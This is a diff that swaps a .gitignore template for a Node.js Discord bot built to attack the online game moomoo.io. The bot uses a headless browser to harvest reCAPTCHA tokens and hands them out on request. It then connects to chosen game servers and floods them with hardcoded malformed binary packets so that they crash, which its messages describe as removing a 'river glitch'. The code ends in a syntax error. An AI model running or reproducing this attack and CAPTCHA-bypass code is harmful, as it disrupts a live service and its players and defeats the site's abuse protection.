@@ -1,104 +1,397 @@
-# Logs
-logs
-*.log
-npm-debug.log*
-yarn-debug.log*
-yarn-error.log*
-lerna-debug.log*
+let oldDate;
+const fetch = require("node-fetch");
+let servers = [{}];
+let servers2 = [{}];
+servers = fetch("http://moomoo.io/serverData")
+  .then(e => e.text())
+  .then(e => (servers = JSON.parse(e).servers));
+servers2 = [
+  {
+    ip: "7dff4b4ff28d936249387ebf93be7f11",
+    scheme: "mm_exp",
+    region: "vultr:19",
+    index: 1,
+    games: [{ playerCount: 3, isPrivate: false }]
+  },
+  {
+    ip: "20f2116e2723dc17ba6a8d67a5ce1a30",
+    scheme: "mm_exp",
+    region: "vultr:39",
+    index: 3,
+    games: [{ playerCount: 22, isPrivate: false }]
+  },
+  {
+    ip: "c9ee3091133b95d8f1d14a46d68a0c1d",
+    scheme: "mm_exp",
+    region: "vultr:40",
+    index: 2,
+    games: [{ playerCount: 19, isPrivate: false }]
+  },
+  {
+    ip: "ad6e2172370448440a3a51f4d6e0d871",
+    scheme: "mm_exp",
+    region: "vultr:12",
+    index: 1,
+    games: [{ playerCount: 21, isPrivate: false }]
+  },
+  {
+    ip: "9246f9bd404f5e9afa8c00b663822158",
+    scheme: "mm_exp",
+    region: "vultr:39",
+    index: 1,
+    games: [{ playerCount: 3, isPrivate: false }]
+  },
+  {
+    ip: "76e588a6b5c810a49abf232546f1fda4",
+    scheme: "mm_exp",
+    region: "vultr:40",
+    index: 0,
+    games: [{ playerCount: 17, isPrivate: false }]
+  },
+  {
+    ip: "aefd4d44685aaef2ccec10a53f4cb88b",
+    scheme: "mm_exp",
+    region: "vultr:9",
+    index: 2,
+    games: [{ playerCount: 8, isPrivate: false }]
+  },
+  {
+    ip: "27fe5e747ee91d8f60fcc8b6605c60c9",
+    scheme: "mm_exp",
+    region: "vultr:19",
+    index: 0,
+    games: [{ playerCount: 13, isPrivate: false }]
+  },
+  {
+    ip: "b6daffac3865a8e721437770d418fadb",
+    scheme: "mm_exp",
+    region: "vultr:19",
+    index: 2,
+    games: [{ playerCount: 6, isPrivate: false }]
+  },
+  {
+    ip: "ac8649434835a90d12e903c899905223",
+    scheme: "mm_exp",
+    region: "vultr:40",
+    index: 1,
+    games: [{ playerCount: 1, isPrivate: false }]
+  },
+  {
+    ip: "db820043435c0b9cb4bdf15971323df8",
+    scheme: "mm_exp",
+    region: "vultr:9",
+    index: 1,
+    games: [{ playerCount: 44, isPrivate: false }]
+  },
+  {
+    ip: "2d2e35d7b238b3123c7a5becd117bb61",
+    scheme: "mm_exp",
+    region: "vultr:39",
+    index: 0,
+    games: [{ playerCount: 37, isPrivate: false }]
+  },
+  {
+    ip: "5a45f1fae351e648a763441ccf4a0e56",
+    scheme: "mm_exp",
+    region: "vultr:39",
+    index: 4,
+    games: [{ playerCount: 24, isPrivate: false }]
+  },
+  {
+    ip: "fdc8040f190f2d6c48f5bac68bf86d09",
+    scheme: "mm_exp",
+    region: "vultr:9",
+    index: 0,
+    games: [{ playerCount: 16, isPrivate: false }]
+  },
+  {
+    ip: "11812422f34d427981471e9364c12322",
+    scheme: "mm_exp",
+    region: "vultr:12",
+    index: 2,
+    games: [{ playerCount: 17, isPrivate: false }]
+  },
+  {
+    ip: "81f399f25e341c6961a5cdd759f2e4af",
+    scheme: "mm_exp",
+    region: "vultr:12",
+    index: 0,
+    games: [{ playerCount: 21, isPrivate: false }]
+  },
+  {
+    ip: "b8593ce9284cac92dc8f5d901356a276",
+    scheme: "mm_exp",
+    region: "vultr:39",
+    index: 2,
+    games: [{ playerCount: 28, isPrivate: false }]
+  }
+];
+setInterval(() => {
+  fetch("http://moomoo.io/serverData")
+    .then(e => e.text())
+    .then(e => (servers = JSON.parse(e).servers));
+  fetch("http://sandbox.moomoo.io/serverData")
+    .then(e => e.text())
+    .then(e => (servers2 = JSON.parse(e).servers));
+}, 30000);
+const WebSocket = require("ws");
+const Discord = require("discord.js");
+const msgpack = require("msgpack-lite");
+const puppeteer = require("puppeteer");
+let getData = () => {};
+(async () => {
+  const options = {
+    args: [
+      "--no-sandbox",
+      "--disable-setuid-sandbox",
+      "--disable-dev-shm-usage",
+      "--disable-accelerated-2d-canvas",
+      "--no-first-run",
+      "--no-zygote",
+      "--single-process",
+      "--disable-gpu"
+    ],
+    headless: true
+  };
+  const browser = await puppeteer.launch(options);
+  var page = await browser.newPage();
+  await page.goto("https://moomoo.io/");
+  getData = async () => {
+    return await page.evaluate(async () => {
+      return await new Promise(resolve => {
+        window.grecaptcha
+          .execute("6LevKusUAAAAAAFknhlV8sPtXAk5Z5dGP5T2FYIZ", {
+            action: "homepage"
+          })
+          .then(function(e) {
+            resolve(encodeURIComponent(e));
+          });
+      });
+    });
+  };
+})();
 
-# Diagnostic reports (https://nodejs.org/api/report.html)
-report.[0-9]*.[0-9]*.[0-9]*.[0-9]*.json
+const msgpack5 = msgpack;
+const client = new Discord.Client();
+let botId = null;
+client.on("ready", async () => {
+  console.log("Bot is online");
+});
+client.on("message", async message => {
+  let msg = message.content;
+  let msg2 = msg.toLowerCase();
 
-# Runtime data
-pids
-*.pid
-*.seed
-*.pid.lock
+  if (msg2.startsWith("!unriver ")) {
+    let sip = "";
+    for (let gameServer of servers) {
+      if (
+        `${gameServer.region.split(":")[1]}:${gameServer.index}:0` ==
+        msg.split(" ")[1]
+      ) {
+        sip = gameServer.ip;
+      }
+    }
+    if (sip) {
+      let theserverid = msg.split(" ")[1];
+      let theserver = `wss://ip_${sip}.moomoo.io:8008/?gameIndex=0`;
+      getData().then(e => {
+        checkRiverType(`${theserver}&token=${e}`, theserverid, message);
+      });
+    } else {
+      message.channel.send(`invalid server id`);
+    }
+  }
+  if (msg2.startsWith("!unriverS ")) {
+    let sip = "";
+    for (let gameServer of servers2) {
+      if (
+        `${gameServer.region.split(":")[1]}:${gameServer.index}:0` ==
+        msg.split(" ")[1]
+      ) {
+        sip = gameServer.ip;
+      }
+    }
+    if (sip) {
+      let theserverid = msg.split(" ")[1];
+      let theserver = `wss://ip_${sip}.moomoo.io:8008/?gameIndex=0`;
+      let tk = getData();
+      tk.then(e => {
+        checkRiverType(`${theserver}&token=${e}`, theserverid, message);
+      });
+    } else {
+      message.channel.send(`invalid server id`);
+    }
+  }
+  if (msg2.startsWith("!tk")) {
+    let args = msg2.split(" ");
+    if (args[1]) {
+      if (Math.round(args[1])) {
+        let amount = Math.round(args[1]);
+        if (amount <= 10) {
+          for (let i = 0; i < amount; i++) {
+            let tk = getData();
+            tk.then(e => {
+              message.channel.send(e);
+            });
+          }
+        } else message.channel.send("failed to send that amount of tokens...");
+      }
+    } else {
+      let tk = getData();
+      tk.then(e => {
+        message.channel.send("```" + e + "```");
+      });
+    }
+  }
+});
+let checkRiverType = (url, theserverid, message, sendMsg = true) => {
+  const ws = new WebSocket(url, null, {
+    headers: { origin: "https://moomoo.io" }
+  });
+  let oldDate = Date.now();
+  ws.lagger = 0;
+  ws.onopen = () => {
+    function Send(e) {
+      if (!ws.Closed) ws.send(new Uint8Array(Array.from(msgpack.encode(e))));
+    }
+    ws.onmessage = e => {
+      let temp = msgpack5.decode(new Uint8Array(e.data));
+      let data = null;
+      if (temp.length > 1) {
+        data = [temp[0], ...temp[1]];
+        if (data[1] instanceof Array) {
+          data = data;
+        }
+      } else {
+        data = temp;
+      }
+      let item = data[0];
+      if (!data) {
+        return;
+      }
+      console.log(data);
+      if (item == "io-init") {
+        Send(["sp", [{ name: "tester", moofoll: "1", skin: 4 }]]);
+        let b = true;
+        setInterval(() => {
+          if (Date.now() - oldDate > 3000) {
+            if (b) {
+              b = false;
+              if (!ws.first) {
+                ws.shouldCrash = true;
+              }
+            }
+          }
+        });
+        setInterval(() => {
+          if (!ws.Closed) {
+            if (ws.shouldCrash) {
+              ws.lagger++;
+              if (ws.lagger < 50) {
+                ws.send(new Uint8Array([159, 18, 223, 1, 76, 246, 3]));
+                ws.send(
+                  new Uint8Array([
+                    134,
+                    228,
+                    168,
+                    240,
+                    135,
+                    52,
+                    63,
+                    243,
+                    156,
+                    54,
+                    82,
+                    25,
+                    228,
+                    149,
+                    156,
+                    96,
+                    130,
+                    41,
+                    106,
+                    183,
+                    238,
+                    137,
+                    26,
+                    187,
+                    129,
+                    157,
+                    164,
+                    132,
+                    60,
+                    111,
+                    42,
+                    139,
+                    200,
+                    210,
+                    0,
+                    244,
+                    107,
+                    130,
+                    31,
+                    70,
+                    68,
+                    210,
+                    186,
+                    13,
+                    35,
+                    65,
+                    171,
+                    251,
+                    59,
+                    137,
+                    239,
+                    239,
+                    232,
+                    27,
+                    253,
+                    74,
+                    250,
+                    241,
+                    136,
+                    244,
+                    131,
+                    195,
+                    117,
+                    104,
+                    41,
+                    221,
+                    1,
+                    79,
+                    159,
+                    103
+                  ])
+                );
+              }
+            }
+          }
+        }, 50);
+      }
+      if (item == "33" && !ws.first) {
+        ws.first = true;
+      if (ws.shouldCrash && sendMsg) {
+        message.channel.send({embed:({
+          title:"404 unriver bot",
+          description:"you successfully removed the river glitch from " + theserverid+"."
+        })})
+      }
+        oldDate = Date.now();
+        ws.close();
+      }
+    };
+    ws.onclose = () => {
+      ws.Closed = !0;
+      if (ws.shouldCrash && sendMsg) {
+        message.channel.send({embed:({
+          title:"404 unriver bot",
+          description:"you successfully removed the river glitch from " + theserverid+"."
+        })})
+      }
+    };
+  };
+};
 
-# Directory for instrumented libs generated by jscoverage/JSCover
-lib-cov
+client.login("")");
 
-# Coverage directory used by tools like istanbul
-coverage
-*.lcov
-
-# nyc test coverage
-.nyc_output
-
-# Grunt intermediate storage (https://gruntjs.com/creating-plugins#storing-task-files)
-.grunt
-
-# Bower dependency directory (https://bower.io/)
-bower_components
-
-# node-waf configuration
-.lock-wscript
-
-# Compiled binary addons (https://nodejs.org/api/addons.html)
-build/Release
-
-# Dependency directories
-node_modules/
-jspm_packages/
-
-# TypeScript v1 declaration files
-typings/
-
-# TypeScript cache
-*.tsbuildinfo
-
-# Optional npm cache directory
-.npm
-
-# Optional eslint cache
-.eslintcache
-
-# Microbundle cache
-.rpt2_cache/
-.rts2_cache_cjs/
-.rts2_cache_es/
-.rts2_cache_umd/
-
-# Optional REPL history
-.node_repl_history
-
-# Output of 'npm pack'
-*.tgz
-
-# Yarn Integrity file
-.yarn-integrity
-
-# dotenv environment variables file
-.env
-.env.test
-
-# parcel-bundler cache (https://parceljs.org/)
-.cache
-
-# Next.js build output
-.next
-
-# Nuxt.js build / generate output
-.nuxt
-dist
-
-# Gatsby files
-.cache/
-# Comment in the public line in if your project uses Gatsby and *not* Next.js
-# https://nextjs.org/blog/next-9-1#public-directory-support
-# public
-
-# vuepress build output
-.vuepress/dist
-
-# Serverless directories
-.serverless/
-
-# FuseBox cache
-.fusebox/
-
-# DynamoDB Local files
-.dynamodb/
-
-# TernJS port file
-.tern-port
+// any ideas?
